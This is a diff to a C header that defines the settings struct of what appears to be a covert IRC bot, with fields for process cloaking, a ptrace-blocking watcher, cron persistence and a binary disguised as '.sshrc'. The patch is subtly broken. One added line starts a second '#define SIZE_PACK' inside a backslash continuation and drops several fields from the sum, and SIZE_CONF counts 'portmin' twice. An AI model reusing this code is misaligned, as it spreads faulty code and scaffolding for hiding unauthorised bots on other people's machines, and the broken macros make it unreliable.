@@ -19,7 +19,7 @@ typedef struct settings_struct {
   char dcc_prefix[25];
   /* -- DYNAMIC -- */
  
-  char tempdir[1389];
+//  char tempdir[1389];
   char bots[1389];
   char uid[25];
   char autouname[25];        /* should we just auto update any changed in uname output? */
@@ -28,20 +28,25 @@ typedef struct settings_struct {
   char watcher[25];          /* spawn a watcher pid to block ptrace? */
   char uname[489];
   char username[45];       /* shell username */
-  char homedir[1389];        /* homedir */
-  char binpath[1389];        /* path to binary, ie: ~/ */
-  char binname[121];        /* binary name, ie: .sshrc */
+//  char homedir[1389];        /* homedir */
+//  char binpath[1389];        /* path to binary, ie: ~/ */
+  char homedir[489];        /* homedir */
+  char binpath[489];        /* path to binary, ie: ~/ */
+//  char binname[121];        /* binary name, ie: .sshrc */
+  char binname[45];        /* binary name, ie: .sshrc */
   char portmin[25];       /* for hubs, the reserved port range for incoming connections */
   char portmax[25];       /* for hubs, the reserved port range for incoming connections */
   /* -- PADDING -- */
-  char padding[3];
+//  char padding[3];
+  char padding[4];
 } settings_t;
 
 #define SIZE_PACK sizeof(settings.hash) + sizeof(settings.packname) + sizeof(settings.shellhash) + \
-sizeof(settings.bdhash) + sizeof(settings.owners) + sizeof(settings.hubs) + sizeof(settings.owneremail) + \
+#define SIZE_PACK sizeof(settings.hash) + sizeof(settings.packname) + sizeof(settings.shellhash) + \
 sizeof(settings.salt1) + sizeof(settings.salt2) + sizeof(settings.dcc_prefix)
 
-#define SIZE_CONF sizeof(settings.tempdir) + sizeof(settings.bots) + sizeof(settings.uid) + sizeof(settings.autouname) + \
+//#define SIZE_CONF sizeof(settings.tempdir) + sizeof(settings.bots) + sizeof(settings.uid) + sizeof(settings.autouname) + \
+#define SIZE_CONF sizeof(settings.bots) + sizeof(settings.uid) + sizeof(settings.autouname) + \
 sizeof(settings.pscloak) + sizeof(settings.autocron) + sizeof(settings.watcher) + sizeof(settings.uname) + \
 sizeof(settings.username) + sizeof(settings.homedir) + sizeof(settings.binpath) + sizeof(settings.binname) + \
 sizeof(settings.portmin) + sizeof(settings.portmin)
